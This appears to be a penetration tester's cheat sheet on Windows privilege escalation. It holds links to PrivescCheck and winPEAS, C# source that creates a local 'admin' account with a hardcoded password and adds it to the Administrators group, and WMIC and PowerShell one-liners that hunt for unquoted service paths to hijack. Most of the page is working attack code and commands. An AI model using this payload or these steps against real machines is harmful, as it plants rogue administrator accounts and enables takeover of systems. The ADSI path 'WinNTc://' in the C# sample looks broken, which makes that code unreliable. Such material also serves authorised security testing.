# Privilege Escalation Scripts
- [PrivescCheck [20220608]](https://github.com/itm4n/PrivescCheck)
- [Windows Privilege Escalation Awesome Scripts [20220501]](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

# Add a user to the local system - C#
- [Add a user to the local system - C#](https://docs.microsoft.com/en-us/troubleshoot/developer/visualstudio/csharp/language-compilers/add-user-local-system)
```csharp
// "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:exe /r:"C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.DirectoryServices.dll" Program.cs

using System;
using System.DirectoryServices;

class Class1
{
    static void Main(string[] args)
    {
        try
        {
            DirectoryEntry AD = new DirectoryEntry("WinNTc://" +
            Environment.MachineName + ",computer");
            DirectoryEntry NewUser = AD.Children.Add("admin", "user");
            NewUser.Invoke("SetPassword", new object[] {"#12345Abc"});
            NewUser.Invoke("Put", new object[] {"Description", "Test User from .NET"});
            NewUser.CommitChanges();
            DirectoryEntry grp;

            grp = AD.Children.Find("Administrators", "group");
            if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
            Console.WriteLine("Account Created Successfully");
            Console.ReadLine();
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
            Console.ReadLine();
        }
    }
}
```

# Unquoted Service Paths

## WMIC
```batchfile
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

## PowerShell
```powershell
$result = $null
$result = Get-WmiObject win32_service | Where-Object {($_.PathName -like '* *') -and ($_.PathName -notlike '*"*') -and ($_.PathName -notlike '*C:\Windows*')} | ForEach-Object { Write $_.PathName }
if ($result -ne $null) { Write $result | Sort -Unique } else { Write "Weak services were not found." }
```

## Specific service
```batchfile
sc qc "<service name>"
```

